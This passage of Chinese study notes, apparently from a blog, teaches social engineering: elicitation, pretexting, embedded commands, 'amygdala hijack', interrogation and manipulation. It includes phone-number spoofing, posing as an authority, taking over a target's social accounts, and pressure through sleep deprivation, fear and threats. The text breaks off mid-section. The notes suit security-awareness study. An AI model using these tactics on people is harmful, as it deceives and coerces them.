title="铺垫"></a>铺垫</h2><p>以一种<strong>隐晦或婉转</strong>的方式植入想法或思路</p><hr><h2 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h2><ol><li>不惧与他人交谈，并处于非常规的场景中</li><li>真正关心他人，即使是陌生人，乐于分享和倾听</li><li>只在有了真正的解决方案时才提供建议或帮助</li><li>在他人说出自己的问题时，不做主观判断</li></ol><hr><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><ul><li>唤醒他人的自我<br>  精心地吹捧会促使目标说出一些重要的信息</li><li>表达共同的主题<br>  一种迅速拓展关系的手段，会使目标同意进一步地接触，构建信任与和谐的关系</li><li>故意说错<br>  大部分人在听到错误的表达后会有矫正的欲望，似乎他们的正确性受到了挑战，以告诉他人显示自己的学识渊博，不能容忍错误表达</li><li>主动提供信息<br>  利用”责任感”，在交流中主动提供信息会促使目标提供同样价值的信息，人们喜欢分享类似的信息</li><li>假装高深<br>  展示一些信息，假装知道一些内情，使用诱导继续展开话题</li><li>利用酒精地影响(第三方手段)<br>  酒后吐真言</li></ul><hr><h2 id="提问的技术"><a href="#提问的技术" class="headerlink" title="提问的技术"></a>提问的技术</h2><ul><li><p>开放式问题<br>  目标的不仅仅用”是”或”不是”可以回答的问题<br>  例如”为什么”/“怎样”<br>  若目标很抵触开放式问题，可以使用<strong>金字塔方法</strong>，从范围窄的问题开始询问，一步一步拓宽问题</p></li><li><p>封闭式问题<br>  限制目标回答的范围(有穷)<br>  通常不是为了得到详细的信息，而是对话题进行引导</p></li><li><p>引导式问题<br>  具有答案暗示的开放性问题<br>  引导目标，为其提供表达自己观点的机会，但是限制其发挥范围<br>  暗示目标你对问题的答案已经有所了解</p></li></ul><blockquote><p>人们通常会构造自己的记忆来契合自己对世界的认知，因此在进行诱导时可以利用这一手段来构造或扰乱目标的记忆</p></blockquote><ul><li><p>假设性问题<br>  假设目标对问题已经拥有特定的知识<br>  通常此类问题是确定目标是否拥有特定的信息<br>  不要让目标了解事情的全貌，否则会丧失话题控制权<br>  不能通过假设性问题来指责目标的错误<br>  将事实贯穿在问题中，尽量不要携带虚假信息</p></li><li><p>原则</p><ol><li>问题太多会吓跑目标</li><li>问题太少会让目标觉得不自在</li><li>一次只问一个问题，同时提出的问题太多会使目标出现认知负荷，从而使目标有可能下意识选择性的不回答一些问题</li><li>不能显得太急切或太无趣</li></ol></li></ul><hr><h2 id="建立密切关系"><a href="#建立密切关系" class="headerlink" title="建立密切关系"></a>建立密切关系</h2><ul><li>人为时间限制<br>  人们在遇到一个试图接近自己的陌生人时通常首先会下意识思考”这个人在我的生活中会停留多久”，当人们意识到这个陌生人会在自己的生活中停留很长时间的话会产生戒备心理<br>  因此在接近目标时首先要让目标感觉自己不会打扰目标太久，不要让目标觉得自己的兴趣点在对方身上，使目标安心<br>  例如”可以打扰你一会吗”/“可以问你一个小问题吗”</li><li>匹配的非语言行为<br>  控制环境/微表情/肢体语言</li><li>放慢语速<br>  说话越快越容易出错，也会显得不自信</li><li>同情<br>  同情/悲伤是最快与目标建立关系的方式</li><li>自我抑制<br>  延迟自我意识，使目标的观点/想法/需求优先<br>  表现得谦逊<br>  压低声音<br>  轻柔的/无性别区分地碰触<br>  温和的目光<br>  较低的身体姿势</li><li>包容<br>  适当地包容目标，对目标进行恭维会使目标大脑释放多巴胺</li><li>询问开放式问题<br>  尽量多用开放式问题来拓展话题</li><li>让步<br>  适当与目标分享一些有价值的信息</li><li>互利<br>  给予通常会使目标有回报的需求</li><li>调整预期<br>  不要贪婪，见好就收，需要对诱导结果有一个预期目标</li></ul><h1 id="伪装"><a href="#伪装" class="headerlink" title="伪装"></a>伪装</h1><p>创造虚构的环境以去哪说目标泄露信息或者做出某种行为</p><ul><li><p>前期调查越充分，成功的几率越大(信息收集)<br>  可以利用目标的个人性格或情感依托进行伪装</p></li><li><p>植入个人爱好<br>  在伪装中加入自己感兴趣的话题和活动可以使自己对伪装更加<strong>自信</strong><br>  <strong>自信</strong>有助于说服目标相信你，自信心始终与没目标和任务环境有关</p></li><li><p>认知失调理论<br>  人们倾向于协调自己的信仰/观点乃至几乎所有的认知，如果态度和行为之间存在不协调，就必须修正这种不协调</p><ul><li>影响因素<ol><li>不协调的信念的数量</li><li>每个信念的重要性</li></ol></li><li>消除方式(按照推荐的优先级排序)<ol><li>增加更多协调的信念以超过不协调的信念</li><li>降低不协调信念的重要性</li><li>改变不协调的信你以使它们协调(通过观点/行动/知识使伪装与目标的认知一致或协调)<br>建立信念系统</li></ol></li></ul></li><li><p>练习方言或表达方式<br>  用不同方言与人们共同会留下深刻的印象</p></li><li><p>使用电话<br>  不需要与目标面对面，降低伪装的成本<br>  使用”剧本大纲(Script)”<br>  用适当的方法/语速/语调/音调与措辞表达情感<br>  伪造电话号码</p></li><li><p>伪装越简单越好<br>  保持故事情节/事实和细节的简单性会增强其可信性，过于复杂会使目标甚至自己出现认知负荷<br>  不过分追求细枝末节，允许故事发展，使目标用想象力填补故事空隙<br>  一些错误会使故事更加真实</p></li><li><p>伪装必须显得自然<br>  不要考虑自己的感受<br>  不要把事情太当真<br>  学会寻找相关信息<br>  积累更多经验</p></li><li><p>为目标提供逻辑结论或下一步安排<br>  人们都希望被告知下一步应该做什么<br>  注意提出的要求应该和自己伪装的身份相一致</p></li><li><p>适当的使用工具<br>  标志/工具设备/配套服装/名片等</p></li></ul><h1 id="社会工程心理学"><a href="#社会工程心理学" class="headerlink" title="社会工程心理学"></a>社会工程心理学</h1><h2 id="思维模式"><a href="#思维模式" class="headerlink" title="思维模式"></a>思维模式</h2><p>使目标认可你的非语言行为，用目标认可的表达方式，并且在音量/语调和方言上相匹配</p><ul><li><p>感官<br>  视觉/听觉/触觉/味觉/嗅觉<br>  通常在这五种感官中某一种会占主导地位，其中前三种为主要的感官思维模式</p></li><li><p>视觉思维者(大部分人)<br>  通常记得事物的米娜毛，能够清晰地记住场景<br>  可以清楚的描述过去的时间，甚至可以构建未来事件的图像<br>  视觉输入与他们的决策相关，会依据在视觉上吸引他们的东西来做决策</p><ul><li>特征点<br>  我<strong>明白</strong>你的意思/我<strong>看</strong>那样挺好的/我大概有点<strong>印象</strong>了</li><li>次感元<br>  光线(亮/暗)、尺寸(大/小)、颜色(黑白/彩色)、运动(快/慢)、焦点(清晰/模糊)</li></ul></li><li><p>听觉思维者<br>  会记住事件的声音，相比于视觉思维者，通过倾听而可以获取更多信息<br>  总能记住事情发生的方式，可以用声音唤起记忆<br>  和听觉思维者说话时需要注意措辞，听觉思维者根据听到的词语表达来进行决策</p><ul><li>特征点<br>  <strong>洪亮</strong>并且<strong>清楚</strong>…/这件事<strong>告诉</strong>我…/<strong>听起来</strong>不错</li><li>次感元<br>  音量(大/小)、音调(高/低)、音准(高/低)、节拍(快/慢)、距离(远/近)</li></ul></li><li><p>动觉思维者<br>  特别在意感受，能够记住事物对自己带来的感受<br>  通常喜欢用自己的双手感知物体<br>  使动觉思维者会想起与某一件事相关联的感觉/情感，进行感觉上的练习</p><ul><li>特征点<br>  我能<strong>抓住</strong>那个想法的要点/那个是怎么<strong>抓住</strong>你的/我会<strong>联系</strong>你的</li><li>次感元<br>  强度(强/弱)、面积(大/小)、质地(粗糙/光滑)、温度(冷/热)、重量(重/轻)</li></ul></li><li><p>辨别主导感官<br>  自我介绍-&gt;开始简短交流-&gt;观察-&gt;提问</p></li></ul><p>识别并利用他人的主导感官，使其处于非常舒适的氛围中</p><hr><h2 id="神经语言程序学-NLP"><a href="#神经语言程序学-NLP" class="headerlink" title="神经语言程序学(NLP)"></a>神经语言程序学(NLP)</h2><p>一种人际沟通模型，主要关注成功的行为模式和内在的主观经验之间的关系，一种非传统的治疗系统，旨在教育人们要有自我意识和有效沟通，并改变他们的心里和情绪行为的模式</p><ul><li><p>准则<br>  人们必须通过潜意识思维做出改变，新的行为必须符合其原始的积极意向，而且改变必须发生于思维状态内部，而不仅仅是行为层面</p></li><li><p>语音语调<br>  使用嵌入式指令影响目标以某种方式进行思考或采取某种行动<br>  通过变换语调强调句子中的某些词语，是人们的潜意识将重点放在那些词语上</p></li><li><p>句型结构<br>  改变句子中的语音下降点嵌入命令</p><pre><code>句尾音调上扬 - 疑问平滑 - 陈述下降 - 命令</code></pre></li><li><p>终极声音<br>  降低命令的语调<br>  让声音具有动感<br>  发挥气息的极限<br>  使胸腔产生共鸣</p></li><li><p>要点</p><ol><li>通过使用音调和重音在目标潜意识中嵌入命令</li><li>谨慎的选择用词<br> 积极的词语使目标积极思考<br> 消极的词语是目标不会思考太多</li><li>创建一个可用于当面或电话社会工程学命令语句列表</li></ol></li></ul><hr><h2 id="思维缓冲溢出"><a href="#思维缓冲溢出" class="headerlink" title="思维缓冲溢出"></a>思维缓冲溢出</h2><ul><li><p>基本原则<br>  人们最终在有意识地做出决定时，他们的决定不仅仅依据听到的内容，还有涉及视觉/感觉和情感</p></li><li><p>预期定律<br>  人们通常会遵循他们感受到的别人的期望或要求来做决定</p><pre><code>例如&quot;你认识我的那个邻居拉尔夫吗，他总是开着那辆绿色的车&quot;则在目标中植入的信息如下：    我认识我的邻居    他叫拉尔夫    他有驾照    他开着一辆绿色的车</code></pre></li><li><p>嵌入式指令</p><ul><li><p>基本原则</p><ol><li>指令简短(3-4个字符)以避免认知负荷</li><li>在普通的语句中加入强调(语气要正常)</li><li>搭配适当的面部表情和肢体语言</li></ol></li><li><p>创建一种情绪或思维模式<br>  当你…/当你…时感觉是怎样的/有个人能够…/既然你…</p></li><li><p>巧用引用或故事<br>  将指令嵌入故事中</p></li><li><p>善用否定<br>  利用人们的逆反心理</p></li><li><p>使目标想象<br>  使目标需要适当的联想才能回答</p></li><li><p>思维缓冲区溢出 = 预期定律 + 思维铺垫 + 嵌入式指令</p><p>首先在与目标开始交谈时结合使用短语/肢体语言和假定性言辞，假设所要求的事情已经实现<br>之后通过一些语句在目标思维中做铺垫，方便后续指令植入</p></li></ul></li></ul><hr><h2 id="手势"><a href="#手势" class="headerlink" title="手势"></a>手势</h2><ul><li>锚定<br>  用特定的手势与一种类似表达形式相关联<pre><code>例如:    当谈论到积极的想法时使用右手手势    当谈论到消极的想法时使用左手手势    即可锚定左手代表消极，右手代表积极</code></pre></li><li>镜像<br>  尝试匹配目标的个性化手势<br>  目标在看到熟悉的手势时会有自在的感觉<br>  但是不要完全相同，否则会起到反作用</li><li>手势摆放<br>  观察目标手臂及手的摆放和位置<ul><li>感到放松时肘部会没有拘束的放在身体两侧</li><li>感到威胁/害怕时肘部向胸腔收近(保护重要器官)</li><li>目标可能会用手势描述出不会说出的信息</li><li>手掌张开表示诚意</li><li>将指尖搭在一起代表自信，认为自己很有权威</li><li>敲击/打击手指代表焦虑</li><li>摸脸/下巴代表思考</li><li>触摸头发代表不安</li><li>触摸耳朵代表犹豫不决</li></ul></li></ul><p>适当利用手势有助于伪装</p><ul><li>不要刻意记手势，而是要记住手势的附加信息</li><li>避免单调/重复的手势</li><li>避免表示焦虑或者动作过大的手势</li><li>手势不要过多</li></ul><hr><h2 id="聆听"><a href="#聆听" class="headerlink" title="聆听"></a>聆听</h2><p>一个人讲话的方式可以透露出很多信息(情绪/语速/状态)</p><ul><li>集中注意力，高度关注目标<br>  密切专注目标的肢体语言/面部表情</li><li>提供聆听的证据<br>  表现出真诚与微笑，不时地点头，证明正在积极地聆听目标</li><li>提供有价值的反馈<br>  时不时地重述或概括聆听到的内容<br>  或者提问相关问题代表有很强的欲望去深入理解</li><li>不要打断目标<br>  尽量不要打断，但是情况适当的打断也是一种手段</li><li>适当的反应<br>  保持尊重，注意自己的情绪，尽量抑制自己的成见<br>  反射性响应<ul><li>积极聆听</li><li>当需要做出回应时注意自己的情绪</li><li>重复/概括听到的内容</li><li>可以用一些含糊的词语做出反应</li></ul></li></ul><hr><h2 id="共识"><a href="#共识" class="headerlink" title="共识"></a>共识</h2><p>无意识的人类互动最重要的特性或特征之一<br>是看法上的共性，与交谈的另一方达成同步，或处于相同的波段</p><ul><li>真正的想要了解他人</li><li>注意自身形象(着装/外表/个人卫生)</li><li>善于聆听</li><li>留心对他人的影响，注意自己的第一印象</li><li>尽量少谈论自己，让目标谈论他们自己</li><li>同情心<br>  感同身受，认真倾听，并确定潜在的情感，站在对方的角度思考，但是不要显得盛气凌人</li><li>扩大自己的知识领域</li><li>表达好奇心<br>  保持心胸开阔，探究并且接受别人在某一话题上的想法</li><li>满足他人的需求<br>  创造一个环境满足对方的需求<pre><code>四类基本心里需求：归属/联系/爱权力/地位/能力自由/责任娱乐/学习</code></pre></li><li>使用NLP<ul><li>呼吸频率保持一致</li><li>语音/语调保持一致<br>  留心关键短语</li><li>肢体语言保持一致<br>  表现出类似肢体语言</li></ul></li><li>测试共识的方法<br>  做一些下意识的动作，观察目标是否出现类似动作</li></ul><hr><h2 id="杏仁核劫持"><a href="#杏仁核劫持" class="headerlink" title="杏仁核劫持"></a>杏仁核劫持</h2><p>情绪处理的过程是无意识的，自动的，并且受到输入感官的影响</p><ul><li>杏仁核<br>  杏仁核状大规模灰质，存在于大脑前内侧中间，是颞叶皮层的一部分<br>  人类的情感处理器，处理所有形态的输入（感觉），并且投射到大脑的不同区域（脑干、下丘脑、海马体、基底神经节、大脑皮层）</li><li>自动驾驶<br>  原理：杏仁核处理情感的速度比大脑快<br>  杏仁核激活，新皮质近乎关闭，肾上腺素、荷尔蒙水平及血压升高，记忆开始变得低效，失去高效交流的能力<br>  触发式强制控制负责情绪、同情或社交的脑区可以使人丧失逻辑能力<br>  杏仁核会不断审视环境刺激，寻找触发人们理解周围世界的非语言反馈<br>  感受周围的环境，观察他人从非语言形式表现出的消极情绪，例如有时莫名的不安，紧张，恐惧等，有助于人们保持警惕<br>  情绪可以传染（环境、氛围）</li><li>原理<br>  如果杏仁核处理一些强烈的感觉和情绪，杏仁核会关闭大脑的逻辑思维中心，只依靠感性处理中心作决策（情绪化的决策）</li><li>利用方程式<br>  （感官输入&gt;共情）+逻辑中心关闭=杏仁核劫持+提出要求<br>  杏仁核劫持=辅助非语言行为+情感共鸣内容+提出适当要求</li><li>控制方法<br>  杏仁核劫持是快速的，并且可被强烈的情绪延长，所以如果碰到杏仁核被劫持的情况，停下来暂时屏蔽强烈情感休息一会再做决定</li></ul><h1 id="询问与审讯"><a href="#询问与审讯" class="headerlink" title="询问与审讯"></a>询问与审讯</h1><ul><li><p>区别<br>  询问: 目标在身体和心理上都处于舒适的状态<br>  审讯: 通过审讯场所与问题向目标施压，使其感觉不适</p></li><li><p>留意目标的变化</p></li></ul><table><thead><tr><th>特征</th><th>状态</th></tr></thead><tbody><tr><td>身体姿势</td><td>直立/瘫倒/倾斜</td></tr><tr><td>脸色</td><td>苍白/红/白/变化</td></tr><tr><td>头部</td><td>昂首/倾斜/前/后</td></tr><tr><td>眼睛</td><td>方向/睁开的状态</td></tr><tr><td>手/脚</td><td>动作/位置/颜色</td></tr><tr><td>口唇</td><td>位置/颜色/状态</td></tr><tr><td>主要感觉</td><td>视觉/听觉/活力/感觉</td></tr><tr><td>声音</td><td>音高/速率/变化</td></tr><tr><td>词语</td><td>长/短/音节的数量/功能障碍/停顿</td></tr></tbody></table><p>注意目标的措辞（太短：预先演练过/太长：在准备撒谎）<br>注意时态/代词的变化<br>观察目标的一系列变化，确定目标的自然状态(基准)</p><ul><li><p>方法</p><ul><li>正面交锋<br>  已经确定目标要做的事，并且要求目标立刻去做(NLP/命令)</li><li>主题延伸<br>  审讯者假定一个故事场景并多次传递给目标，观察目标的反应<br>  展示辅助性的证据直接支持所描述的场景(伪装)</li><li>应付拒绝与反对<br>  预先制定退出策略，仔细组织主题从而预先消除可能的反对</li><li>保持目标注意力集中<br>  当目标开始考虑行为的不良后果时，克服内在的恐惧，镇定的按照预定目标驱动对方(驱动目标使其无法分神考虑后果)</li><li>展示其他途径(备用计划)</li><li>制定计划<br>  人物：目标的详细信息<br>  事件：准备工作<br>  时间：计划执行的时间段与原因（需要证据支持）<br>  地点：计划的执行地点，确定最佳场所（环境因素）<br>  原因：计划的目标（计划成功的标准）<br>  方式：使用什么样的方式从目标获取信息（NLP/嵌入式指令/缓冲区溢出）</li></ul></li><li><p>其他审讯技巧</p><ul><li>直接<br>  保持足够的信心，并且假设目标会进行反馈</li><li>间接<br>  使目标成为谈话主角，通过诱导或精心设计的问题使目标泄漏信息</li><li>博取同情<br>  在谈话中表达对目标的同情，留下善解他人的印象</li><li>激发情绪<br>  利用前期已经收集的信息，激发并利用目标的情绪</li><li>合乎逻辑<br>  充满信心，使自己的伪装合乎逻辑</li><li>咄咄逼人<br>  提高音量，加快语速，使目标来不及思考合理性</li><li>组合<br>  根据目标个性组合多种方法</li><li>保持冷静<br>  被抓到的时候保持冷静/镇定，从而降低警觉</li><li>挽回面子<br>  挽回目标的面子，给对方一个很好的借口</li><li>自尊心膨胀<br>  令对方感到自豪，鼓吹目标的成就</li><li>夸张<br>  夸大事件的严重性（在合理的范围内）</li><li>循序渐进<br>  一步一步慢慢的突破</li></ul></li></ul><h1 id="影响与操纵"><a href="#影响与操纵" class="headerlink" title="影响与操纵"></a>影响与操纵</h1><p>让他人想要以你所期许的方式去行动/反应/思考或建立信仰的过程</p><ul><li><p>基本原则</p><ol><li>设定明确的目标<br> 想要什么？<br> 如何确认目标已经完成？</li><li>构建共识<br> 了解目标精神状态，站在对方的立场上考虑，表达友善</li><li>洞察环境<br> 对自身和周围环境保持警觉（观察/倾听）</li><li>灵活应变</li><li>内省<br> 理解自己的情感</li></ol></li><li><p>战术</p><ul><li><p>回报——固有期望<br>  人们会帮助那些帮助过他们的人<br>  人们不会伤害那些曾经帮助过他们的人</p><ol><li>送出某样有价值的东西</li><li>制造受惠的感觉，价值越高，受惠感越大</li><li>提出合理的请求</li></ol></li><li><p>义务<br>  基于社会/法律和道德要求，以及责任/合约或承诺人们认为必须要做的事<br>  称赞-&gt;提出请求<br>  黄金法则：己所不欲，勿施于人（对别人友好）</p></li><li><p>让步——对回报的利用（礼尚往来）<br>  必须对接受方有价值<br>  原则</p><ol><li>表示出让步<br> 明确让对方知晓何时作出何种让步</li><li>要求和定义回报<br> 植入回报的种子</li><li>视情况作出让步<br> 作出没有风险的让步</li><li>分批作出让步<br> 所有的让步不一定一次到位</li></ol></li><li><p>稀缺——创造欲望<br>  对可供选择的资源进行分配，由待分配物的稀缺性驱动，资源越稀少，物品的<strong>感知价值</strong>越高</p><ol><li>利用稀缺操纵人们的注意力（人们渴望得到难以企及的东西——成就感）</li><li>制造紧迫感</li><li>利用信息的稀缺性提升信息的价值</li></ol></li><li><p>权威——不敢质疑<br>  人们更愿意听从他们眼中权威人士的指导和建议</p><pre><code>类型：    法律权威（保安/律师等）：伪装成大众敬畏或尊敬的角色    组织权威（老板/领导者/CEO等）：管理阶层    社会权威：社会团体中天生的领导者</code></pre><p>  在适当情况下人们更可能对来自权威的主张作出快速反应，尽管这种所谓的权威甚至根本没有露面<br>  自动对权威作出反应时，人们往往是对权威的符号作出反应，而不是其本身（头衔/衣服/汽车/名片等符号）</p></li><li><p>承诺和一致性<br>  通常人们会在言语、态度和行为上保持一致<br>  根据以往的经验或期望所应有的预期<br>  在作出承诺、明确立场后，人们会更加愿意同意那些和他们初始承诺一致的要求</p><p>  <strong>获取信息承诺</strong></p><ul><li><p>询问那谢目标必须回答“是”的问题</p></li><li><p>希望“自己”能保持言行一致是很好的激励因素</p></li><li><p>人们渴望在他人看来自己始终言行一致</p></li><li><p>人们几乎不会违背自己口头、公开或自愿作出的承诺</p></li><li><p>通过扩大范围来增强其承诺的严肃性</p><p>促使目标承诺采取一些小的行动或表示认同，利用这个承诺扩大范围，从而产生更好的效果</p></li></ul></li><li><p>喜欢<br>  人们喜欢那些喜欢自己的人<br>  人们会倾向于接受朋友给出的坏建议、而不是陌生人给出的好建议</p><ul><li>原则<ul><li>建立共识</li><li>自信积极的态度</li><li>与目标和环境保持一致</li><li>有效的进行沟通</li></ul></li><li>月晕效应<br>  某人的一种特质会影响扩展到其他品质<br>  倾向于关注他人的优点会影响一个人的决定<br>  人们会倾向于将美丽和其他成功特性联系在一起<br>了解目标-&gt;伪装成目标期望的样子-&gt;构建信任关系</li><li>过度满足<br>  过多的正面肯定可能会起到负面效应<br>  需要通过问题或错误来给出肯定</li></ul></li><li><p>共识/社会认同<br>  社会影响会导致一个大的社会群体对正确或错误的判断达成一致</p><ul><li>社会认同<br>  人们会做他人正在做的事情，尽管可能不知道那件事情是否是符合自己价值的<br>  如果和周围人群高行为一致，就不会显得失礼</li><li>不确定<br>  人们在确定并且形式不明的情况下，更可能观察他人的行为，并认为这种行为是正确的</li><li>相似性<br>  人们更倾向于跟随与自己类似的人都引导</li></ul></li></ul></li><li><p>框架<br>  人活中的信息和经历，能够在人们必须作出决定的时候改变其反应方式<br>  任何可以用来改变人们的认知或者人们做决定的方式的东西</p><ul><li><p>参考框架<br>  一组看法、条件或假设，决定了人们如何接近、认知或理解某一事物</p></li><li><p>目标感知和价值<br>  目标对一件事物的认知会提高或降低它的价值</p><p>  例如80%的瘦肉和20%的肥肉</p></li><li><p>框架联盟</p><ul><li><p>框架共振<br>  个人框架由于一致或互补而形成关联</p></li><li><p>条件</p><ul><li>框架努力成果的鲁棒性、完备性和彻底性<br>  诊断框架的问题<br>  分析并找出解决方案<br>  如果成功了，号召行动</li><li>提议的框架和大众信仰系统之间的关系<br>  必须要与个人的核心信仰保持一致</li><li>框架与参与者现实情况的关联<br>  框架必须与目标本人相关，如目标经历的关系必须可信并且可验证</li><li>对当前社会变迁的持续关注，以及框架在当前时代出现的时间点</li></ul></li><li><p>框架桥接（联系）<br>  就某一主题而言，思想上一致，但结构上互不关联的两个框架的连接<br>  在深入了解目标的框架后，发现两者之间的联系，利用这一联系将目标带入你的框架——伪装</p></li><li><p>框架放大<br>  对一个与某议题、问题或者一组事件有关的解释性框架进行阐述及激励——扩大或把焦点放在目标的价值观或信仰上<br>  涉及强调某一事件比其他事件更重要，从而使这个时间能够轻松与其他事件联系起来<br>  可以成功的让现有框架产生混乱，使具有特定信仰的人远离他们的信仰</p></li><li><p>框架扩展<br>  是一种变动的成果，通过将提议的框架边界扩展到一群人的观点、兴趣，特别是情绪，将参与者引入其中<br>  通过扩展框架的边界，将目标的其他主题或兴趣引入其中，与他们达成联盟（一致）<br>  太多的扩展可能会削弱人们对原有框架的支持，导致其在一定程度上丧失吸引力</p></li><li><p>框架转换<br>  当提议的框架很难引起共鸣，而且有时与传统的生活方式、礼制衣机现有的解释框架背道而驰的时候，就需要对框架进行转换<br>  通过提出新的论点说明为什么新的框架更好，意图将目标原有的框架思维和信念转换为新的样子<br>  需要新的价值观和理念来确保人们参与其中，并得到他们的支持（时间/精力/教育/逻辑/深厚的感情纽带）</p></li></ul></li><li><p>利用框架战术</p><ul><li><p>说的每件事都会唤起一个框架<br>  利用语言进行描绘，使目标大脑中描绘出对应的事物</p></li><li><p>框架中定义的词句会唤起思维框架<br>  不必使用确切的字词为他人庙会设想的框架<br>  通过间接表达控制对象的思维（事先计划）</p></li><li><p>否定框架<br>  告诉目标要小心、当心或提防某事，会自动将其引入设想的框架中</p></li><li><p>让目标思考框架会强化框架<br>  每次大脑在关注或考虑某事的时候，该事件会得到强化<br>  通过省略某些细节，仅透露出想要透露的细节，可以创建出他们想要目标思考或感觉的框架<br>  贴标签：通过描述性词句为某事打上标签，将目标带入设定的框架</p><p>适当改变呈现、设定道德选择和价值困境的方式，会对人们的政治选择和政策产生深远的影响</p></li></ul></li></ul></li></ul><hr><h2 id="操纵"><a href="#操纵" class="headerlink" title="操纵"></a>操纵</h2><p>通过自身的技巧控制或影响他人，达到自己的目的</p><ul><li>目的<br>  战胜目标的批判性思维</li><li>自动应答<br>  大脑在接收到问题后会自动作出应答</li><li>条件反射<br>  通过不断的适应，人们会将特定的声音、行为与感觉和情绪相关联</li><li>转移<br>  将人们的注意力从他们的事实行为上转移，改变目标的关注焦点</li><li>问题构造<br>  首先构造一个可怕的问题，然后提供“事实”作为证据，证明问题与解决方案的真实性</li><li>色彩<br>  操纵目标的情绪</li></ul><table><thead><tr><th>颜色</th><th>含义</th></tr></thead><tbody><tr><td>白色</td><td>纯洁/明亮/干净/安全/中立/善良/忠诚</td></tr><tr><td>黑色</td><td>权利/高雅/神秘/力量/权威/深度/稳定/平静/宁静/强化其他色彩</td></tr><tr><td>红色</td><td>喜悦/兴奋/喜庆/行动/能量/健康/速度/激情/欲望/爱/刺激情绪/心跳呼吸加快/血压升高/力量/冲动/武力/威胁/征服/暴力/复仇</td></tr><tr><td>橙色</td><td>温暖/热情/吸引/决心/力量/忍耐/鼓舞/活力/刺激食欲/不安全/无知/迟缓</td></tr><tr><td>金色</td><td>明亮/智慧/财富/威望</td></tr><tr><td>黄色</td><td>能量/乐观/喜悦/高兴/忠诚/精神饱满/让对方觉得成为焦点和受重视/少量应用会激发正面情绪，过多会让目标注意力不集中</td></tr><tr><td>绿色</td><td>大自然/和谐/生命/丰饶/雄心/保护/和平/平静/安全/过多会有贪婪/内疚/嫉妒/混乱</td></tr><tr><td>蓝色</td><td>天空/海洋/智慧/直觉/真理/宁静/健康/力量/知识/镇定/冷静/使新陈代谢变慢/眼睛最容易适应/寒冷/忧郁/沮丧</td></tr><tr><td>紫色</td><td>皇家/高贵/奢侈/创意/神秘</td></tr><tr><td>棕色</td><td>地球/可靠/易接近/惯例/秩序/牢固/相关/秩序感</td></tr></tbody></table><ul><li><p>操纵激励<br>  刺激人们去采取行动的东西</p><ul><li>金钱激励<br>  例如买彩票和优惠券等</li><li>意识激励<br>  人们会被拥有类似梦想和目标的人吸引<br>  具有类似信息的人能够增强彼此的信念和做正确的事的欲望<br>  例如寓言故事和共鸣等</li><li>社会激励<br>  人们对生活和自身的看法，会受周围人群极大影响<br>  例如尾随战术——混入羊群</li></ul></li><li><p>方法</p><ul><li>提高目标的暗示感受性<br>  极端：睡眠和食物匮乏<br>  缓和：时间紧迫<br>  用恐惧、愤怒或激动等情绪扰乱目标后，可以为他植入不同的信念<br>  这些情绪会导致目标暗示接受性提高和判断力下降<br>  首先给目标一个会另其感到恐惧或激动的暗示<br>  然后提供一个解决方案（植入信念）<br>  制造出一个易于接受暗示的环境</li><li>控制目标的环境<br>  通常用于在线社会工程、欺诈和身份盗用等<br>  控制目标能访问的信息类型和数量<br>  例如获取目标社交网站的访问权</li><li>迫使目标重新评估（制造怀疑）<br>  动摇并深挖目标的信仰系统<br>  逐渐削弱目标的信念、意识或对某一情况的情绪控制会让目标感到不安</li><li>让目标感到无能为力（感觉脆弱）<br>  利用权威，让目标对自己的信念逐步丧失信心</li><li>给予非肉体惩罚（让目标产生强烈的情绪反应）<br>  焦虑、怀疑、罪恶感、耻辱等，让目标丧失特权</li><li>威胁目标<br>  对生理痛苦或其他可怕情形的畏惧让目标在压力下崩溃<br>  利用权威制造强烈的恐惧感或有潜在损失的感觉，让目标感到不自在，忧虑</li></ul></li><li><p>技巧</p><ul><li>不要让目标的表现影响你的情绪<br>  控制情绪，保持冷静</li><li>寻找积极的话题<br>  适当，有涵养，有品位</li><li>假定<br>  假定一切——信心，保持信念</li><li>尝试不同的开头</li><li>使用过去时<br>  将过去负面状态和行为放到回忆中，使人有“重新开始”的感觉</li><li>探讨并摧毁<br>  实现思考如何处理潜在的交流障碍或破坏性影响</li></ul></li></ul><h1 id="非语言交流"><a href="#非语言交流" class="headerlink" title="非语言交流"></a>非语言交流</h1><h2 id="身势学——肢体语言"><a href="#身势学——肢体语言" class="headerlink" title="身势学——肢体语言"></a>身势学——肢体语言</h2><p>对非语言身体动作与交流之间的关系的系统研究</p><ul><li><p>手部语言</p><ul><li>起源<br>  神经系统、生存本能、随文化/阶级/家庭或个人变化</li><li>编码<br>  固有编码<br>  形象编码<br>  行为和含义间的关系——象征</li><li>分类<ul><li>象征性动作<br>  包含了一个或两个词的简单短语的直接穿衣<br>  一个为团体、阶级或亚文化群所熟知的准确含义<br>  经常有意的用来向他人传递特定消息<br>  接收者知道其接收的象征动作是有意为之<br>  发送者对交流负责任</li><li>演示性动作<br>  那些与演讲、措辞、内容、声调变化曲线及响度等实时密切相关的行为<br>  强化所说的话的动作姿态<br>  通常没有准确的语言含义<br>  一般不会在没有对话时使用<br>  只有和说话者使用，收听者不会使用<br>  演示性动作随说话的增加、愤怒、恐惧、焦虑、兴奋而增加<br>  感情投资、厌倦、假装关切、不善说谎的人会停止使用演示性动作<ul><li>发令动作<br>  强调某个特殊的词、短语</li><li>表意动作<br>  速写思路</li><li>指示动作<br>  指向物品、地点或时间</li><li>节律动作<br>  描述事件进行的步调</li><li>空间动作<br>  描述空间关系</li><li>活动动作<br>  描述身体运动或非人类肢体运动</li><li>象形动作<br>  描述涉及的物体</li><li>象征动作<br>  阐明某事或代替一句话/短语</li></ul></li><li>操纵性动作<br>  涉及对身体部位或衣着进行整饰的行为<br>  紧张-&gt;搓手<br>  寻求抚慰-&gt;玩弄首饰、扣子或其他衣着物品<br>  玩弄头发、手或戒指等</li></ul></li><li>高度自信<br>  手心向上，手指伸展有助于建立密切关系，增强积极情感<br>  尖塔形手势<br>  双手背到脑后，手臂伸展开（领地意识）<br>  拇指动作：向上露出拇指<br>  腹部动作（下腹部）-&gt;开放性动作<br>  双手张开露出腹部：邀请<br>  双手并拢，至于腹部：命令/要求<br>  向内曲拢手指：命令、指挥<br>  挽起袖子<br>  女生双手叉腰<br>  生殖器指向：自信、支配欲<br>  勾起拇指放在腰带上或裤兜里</li><li>底自信<br>  揉搓双手：紧张、不适<br>  不停叩响指关节<br>  用手抓、揉或对衣着及身体部位进行操纵性动作<br>  拇指向下<br>  藏起或放低拇指<br>  手部闭合<br>  隐藏、放低双手</li></ul></li><li><p>腿、脚部语言<br>  